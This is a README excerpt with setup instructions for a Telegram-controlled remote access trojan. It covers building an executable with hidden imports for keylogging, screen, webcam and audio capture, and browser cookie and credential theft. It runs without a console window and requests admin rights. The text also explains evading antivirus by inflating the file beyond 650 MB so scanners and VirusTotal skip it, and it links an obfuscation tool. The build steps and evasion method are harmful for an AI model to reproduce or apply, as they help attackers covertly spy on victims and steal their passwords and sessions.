## :checkered_flag: Starting ##

```bash
# Register account in telegram
# Create bot with botfather


# Download this project
# In the old version of Rat we used a site for obfuscation and installed pyinstaller with github repo
# But antiviruses now detect it worse than installin pyinstaller via pip
# and Virustotal will show less detection than obfuscation
# But I wouldn't be me if i didn't find an obfuscation method
# There are still decetions , but at least we make fewer of them.

$ Download pyinstaller 5.13.0 or older versions: pip install pyinstaller==5.13.0
# if you downloaded pyinstaller from pip like pip install pyinstaller
# Delete that 

# also i'm recomending you to install and upgrade setuptools and pip
$ pip install --upgrade setuptools pip
# if you don't do this, problems may arise

# Download requiremets.txt
$ pip install -r requirements.txt

# change bot api in python file to your own bot
$ bot = telebot.TeleBot('your api token')

# !MAIN STEP! obfuscation will help to deceive antiviruses
$ For obfuscation we will use my python program which you can find at the link: https://github.com/WhiteeRabbit/fake_file_resizer
$ https://github.com/WhiteeRabbit/fake_file_resizer
# We can increase the file size through this appalication so that antiviruses skip rat beacuse of size.
# For example if you write the size 620 mb , Antivirus Eset will skip that,and it will less detetct.
# Today this is the best obfuscation method of obfuscation 

# after downloading pyinstaller run:
$ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py



# wait for building exe
# !BOT PASSWORD IS: acd

$ run exe and bot started!

<h1 align="left">If you want to avoid scanning some antiviruses you can make that⬇️</h1>
More online scanners and antiviruses also most popular online antivirus scanner virustotal's max allowed file size is 650 MB.
Antiviruses, seeing the file size that it is large, will stupidly not check it! and you will be cool man.
<h3>I wrote a python app that will help you to change your file's size for ex: from 100 mb to 750 mb. </h3>
<h3>With help of this app you can make your file's size as you wanted!(it works on all systems)</h3>
